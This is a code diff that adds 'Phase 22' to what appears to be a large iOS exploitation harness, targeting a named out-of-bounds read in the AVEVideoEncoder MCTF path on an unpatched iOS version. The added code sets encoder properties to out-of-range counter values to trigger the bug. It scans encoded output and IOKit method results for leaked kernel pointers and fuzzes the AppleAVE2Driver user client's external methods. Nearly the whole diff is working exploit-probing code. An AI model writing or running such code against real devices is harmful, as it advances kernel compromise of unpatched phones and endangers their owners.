@@ -70,6 +70,7 @@ extern kern_return_t mach_make_memory_entry_64(
 #include <arpa/inet.h>
 #include <signal.h>
 #include <setjmp.h>
+#import <objc/message.h>
 
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 extern int proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize);
@@ -23817,6 +23818,519 @@ new_modes:
             }
             rlog("--- Phase 21 complete ---\n");
         }
+
+        /* ============================================================
+         * Phase 22: CVE-2026-112466 — AVEVideoEncoder MCTF OOB Read
+         *
+         * The AVEVideoEncoder has an unbounded loop in the MCTF
+         * (Motion-Compensated Temporal Filter) code path. A counter
+         * at session+0x8a8 controls iterations over a 2-element u32
+         * array at session+0x8ac. If counter > 2, reads go OOB into
+         * adjacent session structure fields / kernel heap.
+         *
+         * This phase probes:
+         * 22a: Enumerate all HEVC encoder properties (find MCTF keys)
+         * 22b: VTFrameProcessor temporal noise filter path
+         * 22c: Direct HEVC encode with temporal layer configs
+         * 22d: IOKit direct external method probing
+         *
+         * Fixed in iOS 27.2 — LIVE on our iOS 27.1.
+         * ============================================================ */
+
+        if (r229_round == 229) {
+            rlog("\n=== Phase 22: CVE-2026-112466 MCTF OOB Read Probe ===\n");
+
+            /* ---- 22a: Enumerate HEVC encoder properties ---- */
+            rlog("\n--- 22a: HEVC encoder property enumeration ---\n");
+            {
+                /* Create a minimal HEVC compression session */
+                VTCompressionSessionRef hevc_session = NULL;
+                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+
+                /* Request hardware encoder */
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                    kCFBooleanTrue);
+
+                OSStatus st = VTCompressionSessionCreate(
+                    kCFAllocatorDefault,
+                    1920, 1080,
+                    kCMVideoCodecType_HEVC,
+                    enc_spec,
+                    NULL, NULL, NULL, NULL,
+                    &hevc_session);
+                rlog("  HEVC session create: %d\n", (int)st);
+
+                if (st == 0 && hevc_session) {
+                    /* Get ALL supported properties */
+                    CFDictionaryRef props = NULL;
+                    st = VTSessionCopySupportedPropertyDictionary(
+                        hevc_session, &props);
+                    rlog("  CopySupportedPropertyDictionary: %d\n", (int)st);
+
+                    if (st == 0 && props) {
+                        CFIndex nkeys = CFDictionaryGetCount(props);
+                        rlog("  Total supported properties: %ld\n", (long)nkeys);
+
+                        /* Extract all keys and look for MCTF-related ones */
+                        const void **keys = (const void **)malloc(
+                            sizeof(void*) * (size_t)nkeys);
+                        CFDictionaryGetKeysAndValues(props, keys, NULL);
+
+                        int mctf_count = 0;
+                        for (CFIndex i = 0; i < nkeys; i++) {
+                            CFStringRef key = (CFStringRef)keys[i];
+                            char buf[256];
+                            CFStringGetCString(key, buf, sizeof(buf),
+                                kCFStringEncodingUTF8);
+
+                            /* Log ALL properties — look for temporal/MCTF */
+                            int interesting = 0;
+                            if (strcasestr(buf, "MCTF") ||
+                                strcasestr(buf, "Temporal") ||
+                                strcasestr(buf, "MotionComp") ||
+                                strcasestr(buf, "NoiseFilter") ||
+                                strcasestr(buf, "Denoise") ||
+                                strcasestr(buf, "Strength") ||
+                                strcasestr(buf, "PreFilter") ||
+                                strcasestr(buf, "LRME") ||
+                                strcasestr(buf, "ReferenceFrame")) {
+                                interesting = 1;
+                                mctf_count++;
+                            }
+                            if (interesting) {
+                                rlog("  ** MCTF-RELATED: %s\n", buf);
+                            }
+                        }
+                        rlog("  MCTF-related properties found: %d\n", mctf_count);
+
+                        /* Also log first 60 property names for analysis */
+                        rlog("  --- First 60 properties ---\n");
+                        for (CFIndex i = 0; i < nkeys && i < 60; i++) {
+                            CFStringRef key = (CFStringRef)keys[i];
+                            char buf[256];
+                            CFStringGetCString(key, buf, sizeof(buf),
+                                kCFStringEncodingUTF8);
+                            rlog("  P[%02ld]: %s\n", (long)i, buf);
+                        }
+                        if (nkeys > 60) {
+                            rlog("  --- Remaining %ld properties ---\n",
+                                (long)(nkeys - 60));
+                            for (CFIndex i = 60; i < nkeys; i++) {
+                                CFStringRef key = (CFStringRef)keys[i];
+                                char buf[256];
+                                CFStringGetCString(key, buf, sizeof(buf),
+                                    kCFStringEncodingUTF8);
+                                rlog("  P[%03ld]: %s\n", (long)i, buf);
+                            }
+                        }
+
+                        free(keys);
+                        CFRelease(props);
+                    }
+
+                    /* Try setting various MCTF-candidate properties */
+                    rlog("\n  --- Testing MCTF property candidates ---\n");
+
+                    /* Known candidate names from kernel strings */
+                    const char *mctf_candidates[] = {
+                        "EnableMCTF",
+                        "MCTFStrengthLevel",
+                        "MCTFStrength",
+                        "EnableTemporalFilter",
+                        "TemporalFilterStrength",
+                        "TemporalNoiseFilterStrength",
+                        "MotionCompensatedTemporalFilter",
+                        "EnablePreFilter",
+                        "PreFilterStrength",
+                        "EnableLRME",
+                        "LRMEStrength",
+                        "MCTFInfo",
+                        "LRMEInfo",
+                        NULL
+                    };
+
+                    for (int ci = 0; mctf_candidates[ci]; ci++) {
+                        CFStringRef key = CFStringCreateWithCString(
+                            kCFAllocatorDefault, mctf_candidates[ci],
+                            kCFStringEncodingUTF8);
+
+                        /* Try setting to integer 5 (> 2 to trigger OOB) */
+                        int val = 5;
+                        CFNumberRef num = CFNumberCreate(
+                            kCFAllocatorDefault, kCFNumberIntType, &val);
+                        OSStatus sst = VTSessionSetProperty(
+                            hevc_session, key, num);
+                        rlog("  Set %s=5: %d\n", mctf_candidates[ci], (int)sst);
+
+                        /* Also try boolean true */
+                        OSStatus bst = VTSessionSetProperty(
+                            hevc_session, key, kCFBooleanTrue);
+                        rlog("  Set %s=true: %d\n", mctf_candidates[ci], (int)bst);
+
+                        /* Try reading it back */
+                        CFTypeRef readback = NULL;
+                        OSStatus rst = VTSessionCopyProperty(
+                            hevc_session, key, kCFAllocatorDefault, &readback);
+                        if (rst == 0 && readback) {
+                            CFTypeID tid = CFGetTypeID(readback);
+                            if (tid == CFNumberGetTypeID()) {
+                                int rv = 0;
+                                CFNumberGetValue(readback, kCFNumberIntType, &rv);
+                                rlog("  Read %s: int=%d\n",
+                                    mctf_candidates[ci], rv);
+                            } else if (tid == CFBooleanGetTypeID()) {
+                                rlog("  Read %s: bool=%d\n",
+                                    mctf_candidates[ci],
+                                    CFBooleanGetValue(readback));
+                            } else {
+                                rlog("  Read %s: type=%lu\n",
+                                    mctf_candidates[ci],
+                                    (unsigned long)tid);
+                            }
+                            CFRelease(readback);
+                        } else {
+                            rlog("  Read %s: err=%d\n",
+                                mctf_candidates[ci], (int)rst);
+                        }
+
+                        CFRelease(num);
+                        CFRelease(key);
+                    }
+
+                    VTCompressionSessionInvalidate(hevc_session);
+                    CFRelease(hevc_session);
+                }
+                if (enc_spec) CFRelease(enc_spec);
+            }
+
+            /* ---- 22b: Encode HEVC frames with temporal settings ---- */
+            rlog("\n--- 22b: HEVC encode with temporal settings ---\n");
+            {
+                VTCompressionSessionRef enc = NULL;
+                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                    kCFBooleanTrue);
+
+                /* Use callback to capture encoded output */
+                __block int cb_count = 0;
+                __block uint64_t cb_data_size = 0;
+
+                OSStatus st = VTCompressionSessionCreate(
+                    kCFAllocatorDefault,
+                    1920, 1080,
+                    kCMVideoCodecType_HEVC,
+                    enc_spec, NULL, NULL,
+                    NULL, NULL, /* no callback — use
+                                   VTCompressionSessionEncodeFrameWithOutputHandler */
+                    &enc);
+                rlog("  HEVC session: %d\n", (int)st);
+
+                if (st == 0 && enc) {
+                    /* Set real-time mode and temporal layer count */
+                    VTSessionSetProperty(enc,
+                        kVTCompressionPropertyKey_RealTime,
+                        kCFBooleanTrue);
+
+                    /* Try temporal layer count (might influence MCTF) */
+                    int temporal_layers = 4;
+                    CFNumberRef tl_num = CFNumberCreate(
+                        kCFAllocatorDefault, kCFNumberIntType,
+                        &temporal_layers);
+                    OSStatus tl_st = VTSessionSetProperty(enc,
+                        CFSTR("BaseLayerFrameRateFraction"), tl_num);
+                    rlog("  BaseLayerFrameRateFraction=4: %d\n", (int)tl_st);
+
+                    /* Try setting TemporalLevel property */
+                    int tl_val = 8;
+                    CFNumberRef tl8 = CFNumberCreate(
+                        kCFAllocatorDefault, kCFNumberIntType, &tl_val);
+                    tl_st = VTSessionSetProperty(enc,
+                        CFSTR("TemporalLevel"), tl8);
+                    rlog("  TemporalLevel=8: %d\n", (int)tl_st);
+                    CFRelease(tl8);
+
+                    /* Try MaxTemporalLevel */
+                    tl_val = 8;
+                    CFNumberRef mtl = CFNumberCreate(
+                        kCFAllocatorDefault, kCFNumberIntType, &tl_val);
+                    tl_st = VTSessionSetProperty(enc,
+                        CFSTR("MaxTemporalLevel"), mtl);
+                    rlog("  MaxTemporalLevel=8: %d\n", (int)tl_st);
+                    CFRelease(mtl);
+
+                    /* Prepare and encode frames */
+                    st = VTCompressionSessionPrepareToEncodeFrames(enc);
+                    rlog("  PrepareToEncode: %d\n", (int)st);
+
+                    /* Create pixel buffer */
+                    CVPixelBufferRef pxbuf = NULL;
+                    NSDictionary *pbattrs = @{
+                        (id)kCVPixelBufferIOSurfacePropertiesKey: @{}
+                    };
+                    CVReturn cvr = CVPixelBufferCreate(
+                        kCFAllocatorDefault,
+                        1920, 1080,
+                        kCVPixelFormatType_32BGRA,
+                        (__bridge CFDictionaryRef)pbattrs,
+                        &pxbuf);
+                    rlog("  PixelBuffer create: %d\n", (int)cvr);
+
+                    if (cvr == 0 && pxbuf) {
+                        CVPixelBufferLockBaseAddress(pxbuf, 0);
+                        void *base = CVPixelBufferGetBaseAddress(pxbuf);
+                        size_t len = CVPixelBufferGetDataSize(pxbuf);
+                        memset(base, 0x41, len);
+                        CVPixelBufferUnlockBaseAddress(pxbuf, 0);
+
+                        /* Encode 10 frames */
+                        for (int fi = 0; fi < 10; fi++) {
+                            CMTime pts = CMTimeMake(fi, 30);
+                            CMTime dur = CMTimeMake(1, 30);
+
+                            __block int got_output = 0;
+                            __block size_t out_sz = 0;
+                            __block int out_status = 0;
+
+                            st = VTCompressionSessionEncodeFrameWithOutputHandler(
+                                enc, pxbuf, pts, dur, NULL,
+                                ^(OSStatus ost,
+                                  VTEncodeInfoFlags flags,
+                                  CMSampleBufferRef sbuf) {
+                                    got_output = 1;
+                                    out_status = (int)ost;
+                                    if (sbuf) {
+                                        CMBlockBufferRef bb =
+                                            CMSampleBufferGetDataBuffer(sbuf);
+                                        if (bb) {
+                                            out_sz = CMBlockBufferGetDataLength(bb);
+
+                                            /* Check for kernel data in output */
+                                            char *dp = NULL;
+                                            size_t dl = 0;
+                                            if (CMBlockBufferGetDataPointer(
+                                                    bb, 0, &dl, NULL, &dp) == 0
+                                                && dp && dl >= 8) {
+                                                /* Scan for kernel-like ptrs */
+                                                uint64_t *qw = (uint64_t *)dp;
+                                                size_t nqw = dl / 8;
+                                                int kptr_count = 0;
+                                                for (size_t qi = 0;
+                                                     qi < nqw && qi < 1024;
+                                                     qi++) {
+                                                    uint64_t v = qw[qi];
+                                                    if ((v >> 40) == 0xFFFFFE) {
+                                                        kptr_count++;
+                                                        if (kptr_count <= 3) {
+                                                            /* Use NSLog to also
+                                                               hit os_log */
+                                                            NSLog(@"P22 KPTR "
+                                                                  @"frame %d "
+                                                                  @"off %zu: "
+                                                                  @"0x%llx",
+                                                                fi, qi * 8,
+                                                                (unsigned long long)v);
+                                                        }
+                                                    }
+                                                }
+                                                if (kptr_count > 0) {
+                                                    NSLog(@"P22 KPTR total: %d "
+                                                          @"in frame %d",
+                                                        kptr_count, fi);
+                                                }
+                                            }
+                                        }
+                                    }
+                                });
+                            rlog("  Frame %d encode: st=%d\n", fi, (int)st);
+
+                            /* Brief sleep to let callback fire */
+                            usleep(50000);
+
+                            if (got_output) {
+                                rlog("  Frame %d output: st=%d sz=%zu\n",
+                                    fi, out_status, out_sz);
+                            }
+                        }
+
+                        /* Flush */
+                        VTCompressionSessionCompleteFrames(enc,
+                            kCMTimeInvalid);
+
+                        CVPixelBufferRelease(pxbuf);
+                    }
+
+                    VTCompressionSessionInvalidate(enc);
+                    CFRelease(enc);
+                }
+                if (enc_spec) CFRelease(enc_spec);
+            }
+
+            /* ---- 22c: IOKit direct external method probe ---- */
+            rlog("\n--- 22c: AVEVideoEncoder IOKit probe ---\n");
+            {
+                /* Try to open AVE user client directly */
+                io_service_t svc = IOServiceGetMatchingService(
+                    kIOMainPortDefault,
+                    IOServiceMatching("AppleAVE2Driver"));
+                rlog("  AppleAVE2Driver service: 0x%x\n", svc);
+
+                if (!svc) {
+                    svc = IOServiceGetMatchingService(
+                        kIOMainPortDefault,
+                        IOServiceMatching("AppleAVE2"));
+                    rlog("  AppleAVE2 service: 0x%x\n", svc);
+                }
+
+                if (svc) {
+                    io_connect_t conn = 0;
+                    kern_return_t kr = IOServiceOpen(svc, mach_task_self(),
+                        0, &conn);
+                    rlog("  IOServiceOpen type=0: kr=%d conn=0x%x\n",
+                        kr, conn);
+
+                    if (kr == 0 && conn) {
+                        /* Probe external methods 0-20 for responses */
+                        for (int sel = 0; sel <= 20; sel++) {
+                            uint64_t sin[8] = {0};
+                            uint64_t sout[8] = {0};
+                            uint32_t ocnt = 8;
+                            sin[0] = 5; /* counter value > 2 */
+                            sin[1] = 0;
+                            kr = IOConnectCallScalarMethod(conn, sel,
+                                sin, 2, sout, &ocnt);
+                            if (kr == 0) {
+                                rlog("  Sel %d: OK ocnt=%u out0=0x%llx "
+                                     "out1=0x%llx\n",
+                                    sel, ocnt, sout[0], sout[1]);
+
+                                /* Check for kernel pointers */
+                                for (uint32_t oi = 0; oi < ocnt; oi++) {
+                                    if ((sout[oi] >> 40) == 0xFFFFFE) {
+                                        rlog("  ** KPTR sel %d out[%u]:"
+                                             " 0x%llx\n",
+                                            sel, oi, sout[oi]);
+                                    }
+                                }
+                            } else if (kr != 0xe00002c2 /* unsupported */) {
+                                rlog("  Sel %d: kr=0x%x\n", sel, kr);
+                            }
+                        }
+
+                        /* Also try struct methods */
+                        for (int sel = 0; sel <= 20; sel++) {
+                            uint8_t sin_buf[256] = {0};
+                            uint8_t sout_buf[4096] = {0};
+                            size_t out_sz = sizeof(sout_buf);
+
+                            /* Put counter=5 at known offsets */
+                            uint32_t *sin32 = (uint32_t *)sin_buf;
+                            sin32[0] = 5; /* possible counter */
+                            sin32[1] = 5;
+                            sin32[2] = 5;
+
+                            kr = IOConnectCallStructMethod(conn, sel,
+                                sin_buf, 64, sout_buf, &out_sz);
+                            if (kr == 0 && out_sz > 0) {
+                                rlog("  StructSel %d: OK out_sz=%zu\n",
+                                    sel, out_sz);
+
+                                /* Scan output for kernel pointers */
+                                uint64_t *qw = (uint64_t *)sout_buf;
+                                size_t nqw = out_sz / 8;
+                                int kp = 0;
+                                for (size_t qi = 0; qi < nqw; qi++) {
+                                    if ((qw[qi] >> 40) == 0xFFFFFE) {
+                                        kp++;
+                                        if (kp <= 5) {
+                                            rlog("  ** KPTR struct sel %d "
+                                                 "off %zu: 0x%llx\n",
+                                                sel, qi * 8, qw[qi]);
+                                        }
+                                    }
+                                }
+                                if (kp > 0) {
+                                    rlog("  ** Total kptrs: %d\n", kp);
+                                }
+                            }
+                        }
+
+                        IOServiceClose(conn);
+                    }
+
+                    /* Try type 1-4 user clients */
+                    for (int t = 1; t <= 4; t++) {
+                        io_connect_t c2 = 0;
+                        kr = IOServiceOpen(svc, mach_task_self(), t, &c2);
+                        rlog("  AVE type %d: kr=0x%x\n", t, kr);
+                        if (kr == 0 && c2) IOServiceClose(c2);
+                    }
+
+                    IOObjectRelease(svc);
+                }
+            }
+
+            /* ---- 22d: VTFrameProcessor temporal noise filter ---- */
+            rlog("\n--- 22d: VTFrameProcessor temporal noise filter ---\n");
+            {
+                /* The VTFrameProcessor API (iOS 26+) has a temporal noise
+                 * filter that may internally use the MCTF code path */
+                rlog("  VTFrameProcessor requires iOS 26+ ObjC runtime\n");
+                rlog("  Attempting dynamic class lookup...\n");
+
+                Class vttnfConfig = NSClassFromString(
+                    @"VTTemporalNoiseFilterConfiguration");
+                rlog("  VTTemporalNoiseFilterConfiguration: %p\n",
+                    vttnfConfig);
+
+                if (vttnfConfig) {
+                    /* Get previousFrameCount / nextFrameCount */
+                    id config = [[vttnfConfig alloc] init];
+                    if (config) {
+                        SEL prevSel = NSSelectorFromString(
+                            @"previousFrameCount");
+                        SEL nextSel = NSSelectorFromString(
+                            @"nextFrameCount");
+                        if ([config respondsToSelector:prevSel]) {
+                            NSInteger prev = ((NSInteger(*)(id,SEL))
+                                objc_msgSend)(config, prevSel);
+                            rlog("  previousFrameCount: %ld\n", (long)prev);
+                        }
+                        if ([config respondsToSelector:nextSel]) {
+                            NSInteger next = ((NSInteger(*)(id,SEL))
+                                objc_msgSend)(config, nextSel);
+                            rlog("  nextFrameCount: %ld\n", (long)next);
+                        }
+
+                        /* Check if we can create a VTFrameProcessor */
+                        Class vtfp = NSClassFromString(@"VTFrameProcessor");
+                        rlog("  VTFrameProcessor: %p\n", vtfp);
+                        if (vtfp) {
+                            SEL initSel = NSSelectorFromString(
+                                @"initWithConfiguration:");
+                            if ([vtfp instancesRespondToSelector:initSel]) {
+                                id proc = [[vtfp alloc]
+                                    performSelector:initSel
+                                    withObject:config];
+                                rlog("  Processor created: %p\n", proc);
+                            }
+                        }
+                    }
+                }
+            }
+
+            rlog("\n=== Phase 22 Summary ===\n");
+            rlog("Check output for MCTF-related properties and KPTR leaks.\n");
+            rlog("--- Phase 22 complete ---\n");
+        }
+
 
 
 
